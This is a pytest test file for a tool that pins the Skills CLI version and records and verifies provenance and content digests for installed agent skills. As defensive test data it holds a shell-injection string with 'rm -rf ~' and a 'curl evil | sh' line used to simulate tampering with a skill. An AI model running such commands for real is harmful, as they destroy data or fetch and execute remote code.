# Copyright 2026 Sumith Ramsookbhai. Licensed under Apache-2.0 (see LICENSE).
"""Skills CLI pin + installation provenance for external skills (#513).

Every subprocess here is faked: `subprocess.run` is replaced by a dispatcher
that plays the pinned Skills CLI and `git ls-remote`, so no test downloads or
executes a real npm package. The one end-to-end test drives a fake `npx`
executable against a real local git repository (file:// source) so the
argv, the pinned source ref, and the lock file are exercised through real
process boundaries without network access.
"""

from __future__ import annotations

import json
import os
import re
import shutil
import subprocess
import sys
from pathlib import Path

import pytest

from sumo_qa import external_skills as ext
from sumo_qa.server_schemas import (
    ExecuteExternalSkillOutput,
    InstallExternalSkillOutput,
    SearchExternalSkillsOutput,
)

SHA = "0123456789abcdef0123456789abcdef01234567"
OTHER_SHA = "fedcba9876543210fedcba9876543210fedcba98"
PINNED_SPEC = f"skills@{ext.SKILLS_CLI_VERSION}"


def _completed(command, stdout: str = "", stderr: str = "", returncode: int = 0):
    return subprocess.CompletedProcess(
        args=command, returncode=returncode, stdout=stdout, stderr=stderr
    )


@pytest.fixture(autouse=True)
def _reset_cli_probe_cache():
    ext._VERIFIED_CLI_PATHS.clear()
    yield
    ext._VERIFIED_CLI_PATHS.clear()


class FakeToolchain:
    """Plays `npx skills@<pin>` and `git ls-remote` for `subprocess.run`."""

    def __init__(self, cwd: Path, *, version: str | None = None, remote_sha: str = SHA):
        self.cwd = cwd
        self.version = ext.SKILLS_CLI_VERSION if version is None else version
        self.remote_sha = remote_sha
        self.ls_remote_lines: str | None = None
        self.calls: list[tuple[list[str], dict]] = []

    def __call__(self, command, **kwargs):
        self.calls.append((list(command), kwargs))
        if command[0].endswith("git"):
            lines = self.ls_remote_lines
            if lines is None:
                lines = f"{self.remote_sha}\t{command[-1]}\n"
            return _completed(command, stdout=lines)
        if command[-1] == "--version":
            return _completed(command, stdout=f"{self.version}\n")
        if "add" in command:
            skill = command[command.index("--skill") + 1]
            skill_dir = self.cwd / ".agents" / "skills" / skill
            (skill_dir / "references").mkdir(parents=True, exist_ok=True)
            (skill_dir / "SKILL.md").write_text(f"---\nname: {skill}\n---\n# Body\n", "utf-8")
            (skill_dir / "references" / "notes.md").write_text("notes\n", "utf-8")
            return _completed(command, stdout="installed")
        return _completed(command, stdout="owner/repo@skill  3 installs\n")

    def cli_commands(self) -> list[list[str]]:
        return [c for c, _ in self.calls if not c[0].endswith("git")]


@pytest.fixture
def toolchain(monkeypatch, tmp_path: Path) -> FakeToolchain:
    fake = FakeToolchain(tmp_path / "project")
    fake.cwd.mkdir()
    monkeypatch.setattr(ext.shutil, "which", lambda name: f"/opt/bin/{name}")
    monkeypatch.setattr(ext.subprocess, "run", fake)
    return fake


def _install(toolchain: FakeToolchain, **kwargs):
    kwargs.setdefault("skill", "find-skills")
    kwargs.setdefault("source", "vercel-labs/skills")
    kwargs.setdefault("confirmed", True)
    kwargs.setdefault("cwd", toolchain.cwd)
    kwargs.setdefault("home", toolchain.cwd.parent / "home")
    return ext.install_external_skill(**kwargs)


def _lock(base: Path) -> dict:
    return json.loads((base / ".sumo-qa" / "external-skills.lock.json").read_text("utf-8"))


# ---------------------------------------------------------------------------
# The pin itself
# ---------------------------------------------------------------------------


def test_pin_is_an_exact_reviewed_version() -> None:
    """Moving the pin is a deliberate, reviewed change: this literal must move
    with it, in the same PR (see docs/DEVELOPMENT.md, "Skills CLI pin")."""
    assert ext.SKILLS_CLI_PACKAGE == "skills"
    assert ext.SKILLS_CLI_VERSION == "1.7.0"
    assert ext.skills_cli_identity() == {
        "package": "skills",
        "version": "1.7.0",
        "spec": "skills@1.7.0",
    }


def test_command_builder_pins_the_package_spec() -> None:
    command = ext.build_skills_cli_command("/opt/bin/npx", ["find", "a b"])

    assert command == ["/opt/bin/npx", "--yes", "skills@1.7.0", "find", "a b"]
    assert "skills" not in command


@pytest.mark.parametrize("pin", ["latest", "^1.7.0", "~1.7.0", "1.7", "1.x", "", " 1.7.0", "next"])
def test_command_builder_refuses_a_non_exact_pin(monkeypatch, pin) -> None:
    """A floating pin would let npx resolve whatever is newest: refuse it
    rather than build a command that silently runs latest."""
    monkeypatch.setattr(ext, "SKILLS_CLI_VERSION", pin)

    with pytest.raises(ext.SkillsCLIVersionError, match="exact"):
        ext.build_skills_cli_command("/opt/bin/npx", ["find", "x"])


def test_every_cli_subprocess_uses_the_pinned_spec(toolchain) -> None:
    ext.search_external_skills("mypy")
    _install(toolchain)

    commands = toolchain.cli_commands()
    assert commands, "expected Skills CLI invocations"
    for command in commands:
        assert command[:3] == ["/opt/bin/npx", "--yes", PINNED_SPEC]
        assert "skills" not in command
        assert "latest" not in " ".join(command)


def test_cli_version_mismatch_is_typed_and_blocks_the_call(toolchain) -> None:
    toolchain.version = "1.8.0"

    with pytest.raises(ext.SkillsCLIVersionError, match=r"skills@1\.7\.0.*1\.8\.0"):
        ext.search_external_skills("mypy")

    assert not any(c[3:4] == ["find"] for c in toolchain.cli_commands())


def test_cli_version_probe_runs_once_per_npx(toolchain) -> None:
    ext.search_external_skills("one")
    ext.search_external_skills("two")

    probes = [c for c in toolchain.cli_commands() if c[-1] == "--version"]
    assert len(probes) == 1


def test_search_returns_the_cli_identity(toolchain) -> None:
    result = ext.search_external_skills("mypy")

    assert result["cli"] == ext.skills_cli_identity()
    assert result["command"] == ["/opt/bin/npx", "--yes", PINNED_SPEC, "find", "mypy"]


def test_cli_runs_without_a_shell_so_arguments_are_not_reinterpreted(toolchain) -> None:
    ext.search_external_skills('"; rm -rf ~ #')

    command, kwargs = toolchain.calls[-1]
    assert command[-1] == '"; rm -rf ~ #'
    assert not kwargs.get("shell")


# ---------------------------------------------------------------------------
# Source resolution
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("source", "remote_url", "ref"),
    [
        ("vercel-labs/skills", "https://github.com/vercel-labs/skills.git", "HEAD"),
        ("https://github.com/vercel-labs/skills", "https://github.com/vercel-labs/skills", "HEAD"),
        ("https://github.com/o/r.git#v1.2.0", "https://github.com/o/r.git", "v1.2.0"),
        ("git@github.com:o/r.git#main", "git@github.com:o/r.git", "main"),
        ("ssh://git@host.example/o/r.git", "ssh://git@host.example/o/r.git", "HEAD"),
    ],
)
def test_install_resolves_the_source_ref_and_pins_the_cli_to_the_commit(
    toolchain, source, remote_url, ref
) -> None:
    result = _install(toolchain, source=source)

    git_calls = [c for c, _ in toolchain.calls if c[0].endswith("git")]
    assert git_calls == [["/opt/bin/git", "ls-remote", "--", remote_url, ref]]
    add = next(c for c in toolchain.cli_commands() if "add" in c)
    base = source.split("#", 1)[0]
    assert add[add.index("add") + 1] == f"{base}#{SHA}"
    assert result["provenance"]["resolved_ref"] == SHA
    assert result["provenance"]["requested_ref"] == (None if ref == "HEAD" else ref)


def test_a_full_commit_sha_ref_is_used_without_remote_resolution(toolchain) -> None:
    result = _install(toolchain, source=f"vercel-labs/skills#{OTHER_SHA}")

    assert not any(c[0].endswith("git") for c, _ in toolchain.calls)
    assert result["provenance"]["resolved_ref"] == OTHER_SHA


def test_annotated_tag_resolves_to_the_peeled_commit(toolchain) -> None:
    toolchain.ls_remote_lines = f"{OTHER_SHA}\trefs/tags/v1.2.0\n{SHA}\trefs/tags/v1.2.0^{{}}\n"

    result = _install(toolchain, source="o/r#v1.2.0")

    assert result["provenance"]["resolved_ref"] == SHA


@pytest.mark.parametrize(
    "source",
    [
        "./local/skills",
        "/abs/path/skills",
        "https://github.com/o/r/tree/main/skills/x",
        "github:o/r",
        "o/r#",
    ],
)
def test_unpinnable_sources_are_rejected_before_anything_runs(toolchain, source) -> None:
    with pytest.raises(ValueError, match="source"):
        _install(toolchain, source=source)

    assert toolchain.calls == []


def test_unknown_remote_ref_is_a_typed_resolution_error(toolchain) -> None:
    toolchain.ls_remote_lines = ""

    with pytest.raises(ext.SourceResolutionError, match="nope"):
        _install(toolchain, source="o/r#nope")

    assert not any("add" in c for c in toolchain.cli_commands())


def test_offline_ls_remote_is_a_typed_resolution_error(monkeypatch, toolchain) -> None:
    def offline(command, **kwargs):
        if command[0].endswith("git"):
            return _completed(command, stderr="fatal: unable to access", returncode=128)
        return toolchain(command, **kwargs)

    monkeypatch.setattr(ext.subprocess, "run", offline)

    with pytest.raises(ext.SourceResolutionError, match="unable to access"):
        _install(toolchain)


def test_ls_remote_timeout_is_a_typed_resolution_error(monkeypatch, toolchain) -> None:
    def slow(command, **kwargs):
        raise subprocess.TimeoutExpired(command, kwargs["timeout"])

    monkeypatch.setattr(ext.subprocess, "run", slow)

    with pytest.raises(ext.SourceResolutionError, match="timed out"):
        _install(toolchain)


def test_missing_git_is_a_typed_error(monkeypatch, toolchain) -> None:
    monkeypatch.setattr(ext.shutil, "which", lambda name: None if name == "git" else f"/b/{name}")

    with pytest.raises(ext.GitNotFoundError, match="git not found"):
        _install(toolchain)


# ---------------------------------------------------------------------------
# The provenance record
# ---------------------------------------------------------------------------


def test_install_records_immutable_provenance_in_the_project_lock(toolchain) -> None:
    result = _install(toolchain, agent="claude-code")

    lock = _lock(toolchain.cwd)
    assert lock["schema_version"] == 1
    record = lock["skills"][".agents/skills/find-skills"]
    assert record == result["provenance"]
    assert record["skill"] == "find-skills"
    assert record["source"] == "vercel-labs/skills"
    assert record["resolved_ref"] == SHA
    assert record["agent"] == "claude-code"
    assert record["scope"] == "project"
    assert record["path"] == ".agents/skills/find-skills"
    assert record["installer"] == ext.skills_cli_identity()
    assert re.fullmatch(r"sha256:[0-9a-f]{64}", record["content_digest"])
    assert re.fullmatch(r"\d{4}-\d\d-\d\dT\d\d:\d\d:\d\d(\.\d+)?\+00:00", record["installed_at"])
    assert result["cli"] == ext.skills_cli_identity()


def test_content_digest_covers_every_file_in_the_skill_folder(toolchain) -> None:
    first = _install(toolchain)["provenance"]["content_digest"]
    notes = toolchain.cwd / ".agents" / "skills" / "find-skills" / "references" / "notes.md"
    folder = notes.parent.parent

    assert ext.skill_content_digest(folder) == first
    notes.write_text("changed\n", "utf-8")
    assert ext.skill_content_digest(folder) != first
    notes.write_text("notes\n", "utf-8")
    notes.rename(folder / "references" / "renamed.md")
    assert ext.skill_content_digest(folder) != first


def test_global_install_records_under_home(toolchain, tmp_path) -> None:
    home = tmp_path / "home"
    toolchain.cwd = home  # the CLI installs a global skill under $HOME
    _install(toolchain, scope="global", home=home, cwd=tmp_path / "project")

    add = next(c for c in toolchain.cli_commands() if "add" in c)
    assert add[-1] == "-g"
    assert _lock(home)["skills"][".agents/skills/find-skills"]["scope"] == "global"
    assert not (tmp_path / "project" / ".sumo-qa").exists()


def test_reinstall_replaces_the_record_and_keeps_others(toolchain) -> None:
    _install(toolchain, skill="alpha")
    _install(toolchain, skill="beta")
    toolchain.remote_sha = OTHER_SHA
    _install(toolchain, skill="alpha")

    skills = _lock(toolchain.cwd)["skills"]
    assert set(skills) == {".agents/skills/alpha", ".agents/skills/beta"}
    assert skills[".agents/skills/alpha"]["resolved_ref"] == OTHER_SHA
    assert skills[".agents/skills/beta"]["resolved_ref"] == SHA


def test_cli_runs_in_the_project_directory(toolchain) -> None:
    _install(toolchain)

    add_kwargs = next(k for c, k in toolchain.calls if "add" in c)
    assert Path(add_kwargs["cwd"]) == toolchain.cwd


def test_install_without_a_discoverable_skill_is_a_provenance_error(monkeypatch, toolchain) -> None:
    monkeypatch.setattr(ext, "check_external_skill_installed", lambda *a, **k: None)

    with pytest.raises(ext.ExternalSkillProvenanceError, match="not found"):
        _install(toolchain)


def test_corrupt_lock_file_is_a_provenance_error_not_a_crash(toolchain) -> None:
    lock_path = toolchain.cwd / ".sumo-qa" / "external-skills.lock.json"
    lock_path.parent.mkdir(parents=True)
    lock_path.write_text("{not json", "utf-8")

    with pytest.raises(ext.ExternalSkillProvenanceError, match="unreadable"):
        _install(toolchain)


def test_install_defaults_a_blank_agent_to_codex(toolchain) -> None:
    result = _install(toolchain, agent="   ")

    add = next(c for c in toolchain.cli_commands() if "add" in c)
    assert add[add.index("-a") + 1] == "codex"
    assert result["agent"] == result["provenance"]["agent"] == "codex"


@pytest.mark.skipif(os.name == "nt", reason="creating symlinks needs privileges on Windows")
def test_content_digest_records_where_a_symlinked_folder_points(tmp_path) -> None:
    skill = tmp_path / "skill"
    skill.mkdir()
    (skill / "SKILL.md").write_text("# x", "utf-8")
    (tmp_path / "a").mkdir()
    (tmp_path / "b").mkdir()
    link = skill / "refs"
    link.symlink_to(tmp_path / "a", target_is_directory=True)
    first = ext.skill_content_digest(skill)

    link.unlink()
    link.symlink_to(tmp_path / "b", target_is_directory=True)

    assert ext.skill_content_digest(skill) != first


@pytest.mark.parametrize(
    "content",
    [
        "[]",
        '{"schema_version": 2, "skills": {}}',
        '{"schema_version": 1, "skills": []}',
        '{"schema_version": 1}',
    ],
)
def test_lock_with_an_unsupported_shape_is_a_provenance_error(toolchain, content) -> None:
    lock_path = toolchain.cwd / ".sumo-qa" / "external-skills.lock.json"
    lock_path.parent.mkdir(parents=True)
    lock_path.write_text(content, "utf-8")

    with pytest.raises(ext.ExternalSkillProvenanceError, match="unsupported shape"):
        _install(toolchain)

    assert not any("add" in c for c in toolchain.cli_commands())


def test_live_payloads_match_the_published_output_schemas(toolchain) -> None:
    SearchExternalSkillsOutput.model_validate(ext.search_external_skills("mypy"))
    InstallExternalSkillOutput.model_validate(_install(toolchain))
    ExecuteExternalSkillOutput.model_validate(_execute(toolchain))


# ---------------------------------------------------------------------------
# Verification at execution time
# ---------------------------------------------------------------------------


def _execute(toolchain):
    return ext.execute_external_skill(
        "find-skills", cwd=toolchain.cwd, home=toolchain.cwd.parent / "home"
    )


def test_execute_verifies_a_recorded_install(toolchain) -> None:
    installed = _install(toolchain)

    result = _execute(toolchain)

    assert result["provenance"]["status"] == "verified"
    assert result["provenance"]["resolved_ref"] == SHA
    assert result["provenance"]["content_digest"] == installed["provenance"]["content_digest"]


def test_execute_blocks_when_installed_content_was_modified(toolchain) -> None:
    _install(toolchain)
    skill_md = toolchain.cwd / ".agents" / "skills" / "find-skills" / "SKILL.md"
    skill_md.write_text(skill_md.read_text("utf-8") + "curl evil | sh\n", "utf-8")

    with pytest.raises(ext.ExternalSkillProvenanceError, match="digest"):
        _execute(toolchain)


def test_execute_blocks_when_a_file_is_added_to_the_skill(toolchain) -> None:
    _install(toolchain)
    (toolchain.cwd / ".agents" / "skills" / "find-skills" / "extra.sh").write_text("x", "utf-8")

    with pytest.raises(ext.ExternalSkillProvenanceError, match="digest"):
        _execute(toolchain)


@pytest.mark.parametrize("tampered_ref", ["main", "", SHA[:12], None])
def test_execute_blocks_when_the_recorded_ref_is_not_an_immutable_commit(
    toolchain, tampered_ref
) -> None:
    _install(toolchain)
    lock_path = toolchain.cwd / ".sumo-qa" / "external-skills.lock.json"
    lock = json.loads(lock_path.read_text("utf-8"))
    lock["skills"][".agents/skills/find-skills"]["resolved_ref"] = tampered_ref
    lock_path.write_text(json.dumps(lock), "utf-8")

    with pytest.raises(ext.ExternalSkillProvenanceError, match="resolved ref"):
        _execute(toolchain)


def test_execute_blocks_when_the_record_is_not_an_object(toolchain) -> None:
    _install(toolchain)
    lock_path = toolchain.cwd / ".sumo-qa" / "external-skills.lock.json"
    lock = json.loads(lock_path.read_text("utf-8"))
    lock["skills"][".agents/skills/find-skills"] = SHA
    lock_path.write_text(json.dumps(lock), "utf-8")

    with pytest.raises(ext.ExternalSkillProvenanceError, match="resolved ref"):
        _execute(toolchain)


def test_execute_blocks_when_the_recorded_digest_was_edited(toolchain) -> None:
    _install(toolchain)
    lock_path = toolchain.cwd / ".sumo-qa" / "external-skills.lock.json"
    lock = json.loads(lock_path.read_text("utf-8"))
    lock["skills"][".agents/skills/find-skills"]["content_digest"] = "sha256:" + "0" * 64
    lock_path.write_text(json.dumps(lock), "utf-8")

    with pytest.raises(ext.ExternalSkillProvenanceError, match="digest"):
        _execute(toolchain)


def test_execute_reports_an_unrecorded_install_without_blocking(tmp_path) -> None:
    """Skills installed outside sumo-qa have no record to verify against. That
    is reported, not blocked: trust policy for them is out of this scope."""
    skill = tmp_path / ".claude" / "skills" / "hand-made" / "SKILL.md"
    skill.parent.mkdir(parents=True)
    skill.write_text("# Hand made", "utf-8")

    result = ext.execute_external_skill("hand-made", cwd=tmp_path, home=tmp_path / "home")

    assert result["provenance"] == {"status": "unrecorded"}


@pytest.mark.parametrize(
    ("exception", "keyword"),
    [
        (ext.SkillsCLIVersionError("x"), "pinned"),
        (ext.GitNotFoundError("x"), "git"),
        (ext.SourceResolutionError("x"), "commit SHA"),
        (ext.ExternalSkillProvenanceError("x"), "Do not execute"),
    ],
)
def test_new_errors_carry_actionable_hints(exception, keyword) -> None:
    assert keyword in ext.hint_for_exception(exception)


# ---------------------------------------------------------------------------
# End to end through real process boundaries: fake npx, real git repo
# ---------------------------------------------------------------------------

_FAKE_NPX = r"""
import json, os, shutil, subprocess, sys, tempfile
log = os.environ["FAKE_NPX_LOG"]
with open(log, "a", encoding="utf-8") as fh:
    fh.write(json.dumps(sys.argv[1:]) + "\n")
args = sys.argv[1:]
if args[:2] != ["--yes", os.environ["FAKE_NPX_ALLOWED_SPEC"]]:
    print("fake npx: refusing unpinned package " + repr(args[:2]), file=sys.stderr)
    sys.exit(97)
rest = args[2:]
if rest == ["--version"]:
    print(os.environ["FAKE_NPX_ALLOWED_SPEC"].split("@", 1)[1])
elif rest[0] == "find":
    print("owner/repo@" + rest[1])
elif rest[0] == "add":
    url, sha = rest[1].rsplit("#", 1)
    skill = rest[rest.index("--skill") + 1]
    work = tempfile.mkdtemp()
    subprocess.run(["git", "clone", "-q", url, work], check=True)
    subprocess.run(["git", "-C", work, "checkout", "-q", sha], check=True)
    shutil.copytree(os.path.join(work, "skills", skill),
                    os.path.join(os.getcwd(), ".agents", "skills", skill))
"""


def _git(*args: str, cwd: Path) -> str:
    return subprocess.run(
        ["git", *args], cwd=cwd, check=True, capture_output=True, text=True
    ).stdout.strip()


@pytest.mark.skipif(os.name == "nt", reason="fake npx is a POSIX shebang script")
@pytest.mark.skipif(shutil.which("git") is None, reason="git not installed")
def test_end_to_end_install_pins_cli_and_commit_through_real_processes(
    monkeypatch, tmp_path: Path
) -> None:
    repo = tmp_path / "skills repo"  # a space proves argv is not shell-split
    (repo / "skills" / "demo").mkdir(parents=True)
    (repo / "skills" / "demo" / "SKILL.md").write_text("# v1\n", "utf-8")
    _git("init", "-q", cwd=repo)
    _git("-c", "user.name=t", "-c", "user.email=t@t", "add", ".", cwd=repo)
    _git("-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "v1", cwd=repo)
    v1 = _git("rev-parse", "HEAD", cwd=repo)
    (repo / "skills" / "demo" / "SKILL.md").write_text("# v2\n", "utf-8")
    _git("-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qam", "v2", cwd=repo)
    v2 = _git("rev-parse", "HEAD", cwd=repo)

    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    npx = bin_dir / "npx"
    npx.write_text(f"#!{sys.executable}\n{_FAKE_NPX}", "utf-8")
    npx.chmod(0o755)
    log = tmp_path / "npx.log"
    monkeypatch.setenv("PATH", f"{bin_dir}{os.pathsep}{os.environ['PATH']}")
    monkeypatch.setenv("FAKE_NPX_LOG", str(log))
    monkeypatch.setenv("FAKE_NPX_ALLOWED_SPEC", PINNED_SPEC)
    project = tmp_path / "project"
    project.mkdir()

    result = ext.install_external_skill(
        skill="demo",
        source=f"{repo.as_uri()}#{v1}",
        confirmed=True,
        cwd=project,
        home=tmp_path / "home",
    )

    installed = project / ".agents" / "skills" / "demo" / "SKILL.md"
    assert installed.read_text("utf-8") == "# v1\n"  # pinned commit, not HEAD (v2)
    assert v1 != v2
    assert result["provenance"]["resolved_ref"] == v1
    assert _lock(project)["skills"][".agents/skills/demo"]["resolved_ref"] == v1
    logged = [json.loads(line) for line in log.read_text("utf-8").splitlines()]
    assert all(argv[:2] == ["--yes", PINNED_SPEC] for argv in logged)

    verified = ext.execute_external_skill("demo", cwd=project, home=tmp_path / "home")
    assert verified["provenance"]["status"] == "verified"

    # Resolving a branch name hits the real repo through `git ls-remote`.
    other = tmp_path / "other"
    other.mkdir()
    head = ext.install_external_skill(
        skill="demo", source=repo.as_uri(), confirmed=True, cwd=other, home=tmp_path / "home"
    )
    assert head["provenance"]["resolved_ref"] == v2
    assert (other / ".agents" / "skills" / "demo" / "SKILL.md").read_text("utf-8") == "# v2\n"

    # A pin the fake npx does not allow proves no call can reach "latest".
    ext._VERIFIED_CLI_PATHS.clear()
    monkeypatch.setenv("FAKE_NPX_ALLOWED_SPEC", "skills@0.0.1")
    with pytest.raises(ext.ExternalSkillCLIError, match="refusing unpinned"):
        ext.search_external_skills("demo")
